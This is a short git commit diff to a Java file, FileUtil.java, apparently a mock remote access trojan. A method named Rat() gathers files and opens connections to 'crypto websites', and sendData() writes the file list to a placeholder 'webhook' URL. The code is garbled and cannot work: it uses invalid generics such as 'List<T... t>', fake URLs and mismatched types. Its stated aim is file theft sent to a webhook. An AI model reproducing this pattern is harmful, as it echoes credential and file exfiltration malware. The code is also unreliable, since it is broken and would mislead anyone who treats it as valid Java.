31ded90f754415d45fc57d4d7be1d691d616a560
LiIndexUwU <93841328+LiIndexUwU@users.noreply.github.com>
2022-01-01 22:45:57 +0100

    Update FileUtil.java

--- utils/FileUtil.java
+++ utils/FileUtil.java
@@ -3,12 +3,16 @@ package utils;
 import java.*;
 
 public class FileUtil {
+  List<T... t> files = new ArrayList<T... t>();
   void Rat() {
-    List<T... t> files = new ArrayList<T... t>();
     files.add(new JarFile());
+    List<T...  g> crypto_websites = new ArrayList<(HttpURLConnection) URL>();
+    for (T... g : crypto_websites) {
+      HttpURLConnection website = (HttpURLConnection) new URL("Crypto.com").openConnection();
+    }
   }
   void sendData() {
-    for (File f : files) {
+    for (T... t : files) {
       HttpURLConnection webhook = (HttpURLConnection) new URL("pretend like this is webhook").openConnection();
       try {
         webhook.getOutputStream().write(Arrays.asList(files));
